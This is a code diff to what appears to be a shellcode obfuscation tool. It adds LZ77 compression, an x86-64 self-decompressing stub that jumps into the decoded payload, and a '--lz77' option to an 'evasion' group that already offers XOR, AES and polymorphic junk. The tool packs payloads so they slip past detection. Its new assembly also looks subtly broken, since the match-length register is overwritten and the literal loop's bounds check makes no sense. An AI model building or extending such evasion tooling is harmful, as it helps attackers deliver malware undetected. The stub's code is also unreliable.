@@ -5,6 +5,9 @@ __all__ = [
     "xor_encrypt",
     "rolling_xor_encrypt",
     "rle_encode",
+    "lz77_encode",
+    "lz77_decode",
+    "lz77_decoder_stub",
     "base64_encode",
     "base32_encode",
     "aes_encrypt",
@@ -843,6 +846,103 @@ def rle_encode(data: bytes) -> bytes:
         result += bytes([count, data[i]])
         i += count
     return bytes(result)
+
+
+def lz77_encode(
+    data: bytes, window_size: int = 4096, min_match: int = 3, max_match: int = 18
+) -> bytes:
+    result = bytearray()
+    i = 0
+    while i < len(data):
+        best_offset = 0
+        best_length = 0
+        window_start = max(0, i - window_size)
+        for j in range(window_start, i):
+            length = 0
+            while (
+                i + length < len(data)
+                and length < max_match
+                and data[j + length] == data[i + length]
+            ):
+                length += 1
+            if length > best_length and length >= min_match:
+                best_offset = i - j
+                best_length = length
+        if best_length >= min_match:
+            result += bytes(
+                [0x80 | best_length, (best_offset >> 8) & 0xFF, best_offset & 0xFF]
+            )
+            i += best_length
+        else:
+            result += bytes([data[i]])
+            i += 1
+    return bytes(result)
+
+
+def lz77_decode(data: bytes) -> bytes:
+    result = bytearray()
+    i = 0
+    while i < len(data):
+        if data[i] & 0x80:
+            length = data[i] & 0x7F
+            offset = (data[i + 1] << 8) | data[i + 2]
+            for _ in range(length):
+                result.append(result[-offset])
+            i += 3
+        else:
+            result.append(data[i])
+            i += 1
+    return bytes(result)
+
+
+def lz77_decoder_stub(original_size: int) -> bytes:
+    decoder_asm = f"""
+    mov rsi, rsp
+    add rsi, {32 + original_size}
+    mov rdi, rsp
+    add rdi, 32
+
+decode_lz77:
+    lodsb
+    test al, 0x80
+    jz store_literal
+
+    movzx rbx, al
+    and rbx, 0x7F
+    lodsb
+    movzx rdx, al
+    lodsb
+    movzx rcx, al
+    shl rdx, 8
+    or rcx, rdx
+
+    mov rbx, rcx
+    sub rdi, rcx
+
+copy_match:
+    mov al, byte ptr [rdi]
+    stosb
+    dec rbx
+    jnz copy_match
+    jmp decode_lz77
+
+store_literal:
+    stosb
+    cmp rsi, rsp
+    add rsi, {32 + original_size}
+    jl decode_lz77
+
+    mov rax, rsp
+    add rax, 32
+    jmp rax
+    """
+    try:
+        return myasm(decoder_asm)
+    except Exception as e:
+        print(
+            f"{RED}[-] Error assembling LZ77 decoder stub: {e}{RESET}", file=sys.stderr
+        )
+        raise
 
 
 def generate_polymorphic_junk() -> bytes:
@@ -1735,6 +1835,11 @@ def main() -> int:
         help="Enable RLE encoding (with self-decoder stub)",
     )
     evasion_group.add_argument(
+        "--lz77",
+        action="store_true",
+        help="Enable LZ77 compression (with self-decompressor stub)",
+    )
+    evasion_group.add_argument(
         "--base64", action="store_true", help="Apply Base64 encoding"
     )
     evasion_group.add_argument(
@@ -1970,6 +2075,26 @@ def main() -> int:
                 final_payload = decoder_stub + encoded_payload
                 print(
                     f"{YELLOW}[*] Total size with RLE stub: {len(final_payload)} bytes{RESET}",
+                    file=sys.stderr,
+                )
+
+            if args.lz77:
+                print(
+                    f"{YELLOW}[*] Applying LZ77 compression...{RESET}", file=sys.stderr
+                )
+                encoded_payload = lz77_encode(final_payload)
+                print(
+                    f"{YELLOW}[*] LZ77 Compressed payload size: {len(encoded_payload)} bytes{RESET}",
+                    file=sys.stderr,
+                )
+                decoder_stub = lz77_decoder_stub(payload_size_before_rle)
+                print(
+                    f"{YELLOW}[*] LZ77 Decoder stub size: {len(decoder_stub)} bytes{RESET}",
+                    file=sys.stderr,
+                )
+                final_payload = decoder_stub + encoded_payload
+                print(
+                    f"{YELLOW}[*] Total size with LZ77 stub: {len(final_payload)} bytes{RESET}",
                     file=sys.stderr,
                 )
 
